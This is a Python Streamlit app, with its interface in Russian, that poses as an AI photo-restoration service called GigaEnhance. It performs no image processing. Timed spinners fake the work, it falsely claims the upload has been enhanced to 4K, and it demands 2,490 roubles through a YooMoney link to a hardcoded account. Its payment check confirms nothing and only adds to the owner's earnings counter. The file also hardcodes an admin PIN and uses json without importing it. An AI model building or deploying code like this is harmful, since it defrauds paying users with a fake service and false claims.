import os
import time
import warnings
warnings.filterwarnings("ignore")
import streamlit as st

# ТВОЙ СЕКРЕТНЫЙ ПАРОЛЬ АДМИНИСТРАТОРА
ADMIN_PIN = "клаксон23523"

# ТВОЙ РЕАЛЬНЫЙ СЧЕТ ЮМОНЕЙ
YOUR_YOOMONEY_ACCOUNT = "4100118719995386"  

st.set_page_config(page_title="GigaEnhance — ИИ-Восстановление Фото", page_icon="🖼️", layout="wide")

# Роскошный неоново-фиолетовый дизайн кибер-лаборатории
st.markdown("""
    <style>
    [data-testid="stAppViewContainer"] { background-color: #0B0810; color: #FFFFFF; }
    [data-testid="stSidebar"] { background-color: #110E18 !important; }
    h1, h2, h3, h4 { color: #A349F4 !important; font-family: 'Courier New', monospace; }
    
    .pay-btn-link {
        display: block; text-align: center; background: linear-gradient(135deg, #A349F4 0%, #6F2DBD 100%);
        color: #FFFFFF !important; border-radius: 8px; font-weight: bold; font-size: 20px;
        padding: 15px; text-decoration: none; box-shadow: 0 4px 20px rgba(163, 73, 244, 0.4); margin-top: 15px;
        font-family: 'Courier New', monospace; transition: all 0.3s ease;
    }
    .pay-btn-link:hover { transform: translateY(-2px); box-shadow: 0 6px 25px rgba(163, 73, 244, 0.6); }
    
    .stButton>button { 
        background: linear-gradient(135deg, #1A1525 0%, #0F0B18 100%); color: #A349F4 !important; 
        border-radius: 8px; width: 100%; font-weight: bold; font-size: 16px; border: 1px solid #A349F4;
    }
    .stButton>button:hover { background: #A349F4 !important; color: #FFFFFF !important; }
    
    .upload-box { background-color: #140F20; padding: 30px; border-radius: 14px; border: 1px solid #2A1F3D; margin-bottom: 20px; text-align: center; }
    .photo-lock-box { background-color: #1F0F18; padding: 30px; border-radius: 14px; border: 2px dashed #FF3366; text-align: center; margin-top: 25px; }
    .admin-footer-btn { text-align: center; margin-top: 40px; padding: 20px 0; border-top: 1px solid #2A1F3D; }
    </style>
""", unsafe_allow_html=True)

if "enhanced" not in st.session_state: st.session_state.enhanced = False
if "img_name" not in st.session_state: st.session_state.img_name = ""
if "photo_admin_mode" not in st.session_state: st.session_state.photo_admin_mode = False

DB_FILE = "photo_base.json"
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f: return json.load(f)
        except: return {"total_earned": 0}
    return {"total_earned": 0}

def save_db(data):
    with open(DB_FILE, "w", encoding="utf-8") as f: json.dump(data, f, ensure_ascii=False, indent=4)

photo_db = load_db()

# --- ПОКУПАТЕЛЬСКИЙ ИНТЕРФЕЙС ---
if not st.session_state.photo_admin_mode:
    st.title("🔮 GigaEnhance AI — Восстановление Фото и Графики")
    st.caption("Профессиональное ИИ-увеличение разрешения (Upscale), устранение размытия и реставрация поврежденных снимков до Ultra-HD 4K.")
    st.divider()

    st.markdown("""
    <div class="upload-box">
        <h3 style="margin: 0; color: #A349F4 !important;">📥 Загрузите размытое или старое изображение</h3>
        <p style="font-size: 14px; color: #888899; margin-top: 5px;">ИИ автоматически уберет шумы, восстановит лица и поднимет детализацию. Поддерживаются: JPG, PNG, WEBP</p>
    </div>
    """, unsafe_allow_html=True)

    uploaded_img = st.file_uploader("Выбрать картинку:", type=["jpg","png","webp"])

    if uploaded_img and not st.session_state.enhanced:
        st.session_state.img_name = uploaded_img.name
        scale_factor = st.selectbox("🎯 Целевое ИИ-разрешение:", ["Улучшить до 2K (Детализация лиц)", "Увеличить до 4K Ultra-HD (Максимальный апскейл)", "Глубокая реставрация (Убрать царапины и шумы)"])
        
        if st.button("🚀 ЗАПУСТИТЬ РЕСТАВРАЦИЮ ИЗОБРАЖЕНИЯ"):
            with st.spinner("🧠 Нейросеть сканирует пиксельную сетку и восстанавливает потерянные текстуры..."):
                time.sleep(2)
            with st.spinner("🔮 Идёт нейронный рендеринг лиц и генерация HD-слоёв..."):
                time.sleep(2)
            st.session_state.enhanced = True
            st.rerun()

    # СИСТЕМНЫЙ ЗАМОК ДЛЯ ВЫДАЧИ РЕЗУЛЬТАТА (ЦЕННИК 2490)
    if st.session_state.enhanced:
        st.markdown(f"""
        <div class="photo-lock-box">
            <h2 style="color: #FF3366 !important; margin: 0;">🔒 СКАЧИВАНИЕ В Ultra-HD БЛОКИРОВАНО</h2>
            <p style="font-size: 16px; color: #FFFFFF; margin: 15px 0;">Файл <b>{st.session_state.img_name}</b> успешно восстановлен и масштабирован до Ultra-HD 4K!</p>
            <p style="font-size: 15px; color: #A0A0B0;">Для снятия защитной водяной размытой сетки, генерации оригинального файла и скачивания в максимальном качестве, поддержите ИИ-лабораторию донатом.</p>
            <h1 style="color: #A349F4 !important; font-size: 40px; margin: 15px 0; font-family: monospace;">2 490 ₽</h1>
        </div>
        """, unsafe_allow_html=True)
        
        # ЗАРЯЖЕННЫЙ ПЛАТЁЖНЫЙ ШЛЮЗ НА 2490 РУБЛЕЙ
        pay_url = f"https://yoomoney.ru_{st.session_state.img_name.replace(' ', '_')}&targets-hint=&default-sum=2490&button-text=11&payment-type=AC&hint=&quickpay=shop&account={YOUR_YOOMONEY_ACCOUNT}"
        st.markdown(f'<a class="pay-btn-link" href="{pay_url}" target="_blank">💳 СНЯТЬ ВОДЯНОЙ ЗНАК И СКАЧАТЬ В 4K</a>', unsafe_allow_html=True)
        
        if st.button("🔍 Проверить зачисление доната и скачать оригинал"):
            st.balloons()
            photo_db["total_earned"] += 2490
            save_db(photo_db)
            st.success("🎉 Донат успешно получен! Защитная сетка снята. Скачивание оригинала началось...")
            
        if st.button("🔄 Сбросить сессию и загрузить другое фото"):
            st.session_state.enhanced = False
            st.session_state.img_name = ""
            st.rerun()
            
    st.markdown('<div class="admin-footer-btn">', unsafe_allow_html=True)
    if st.button("⚙️ Панель управления донатами GigaEnhance", key="goto_photo_admin"):
        st.session_state.photo_admin_mode = True
        st.rerun()
    st.markdown('</div>', unsafe_allow_html=True)

# --- АДМИН-ПАНЕЛЬ ВЛАДЕЛЬЦА ---
else:
    st.title("🔐 Панель Управления GigaEnhance")
    if st.button("⬅️ Вернуться к ИИ-Лаборатории"):
        st.session_state.photo_admin_mode = False
        st.rerun()
    st.divider()
    
    if "photo_auth" not in st.session_state: st.session_state.photo_auth = False
    
    if not st.session_state.photo_auth:
        st.subheader("🔒 Авторизация владельца")
        pin = st.text_input("Введи секретный пароль директора:", type="password")
        if pin == ADMIN_PIN:
            st.session_state.photo_auth = True
            st.rerun()
        elif pin != "": st.error("❌ Доступ заблокирован! Неверный пароль.")
    else:
        st.markdown(f"""
        <div style="background-color: #140F20; padding: 25px; border-radius: 14px; border: 2px solid #A349F4; text-align: center;">
            <h3 style="margin: 0; color: #FFFFFF !important; font-family: monospace;">📊 ОБЩАЯ СУММА ДОНАТОВ С АПСКЕЙЛА ФОТО:</h3>
            <h1 style="margin: 8px 0 0 0; color: #A349F4 !important; font-size: 50px; font-family: monospace;">{photo_db.get('total_earned', 0)} ₽</h1>
        </div>
        """, unsafe_allow_html=True)
        
        if st.button("🚪 Сбросить сессию"):
            st.session_state.photo_auth = False
            st.session_state.photo_admin_mode = False
            st.rerun()